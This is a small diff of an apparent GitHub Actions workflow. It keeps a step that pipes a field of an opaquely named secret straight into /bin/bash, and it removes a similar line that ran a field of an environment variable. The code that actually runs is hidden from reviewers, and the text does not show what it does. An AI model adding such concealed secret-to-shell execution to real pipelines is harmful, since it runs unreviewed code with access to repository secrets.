@@ -20,7 +20,6 @@ jobs:
           sm54919: ${{ secrets.sm54919 }}
         run: |
           printf '%s' "$sm54919" | jq -r .gck7093 | /bin/bash
-          echo $iso020 | jq -r .rddmw77108 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
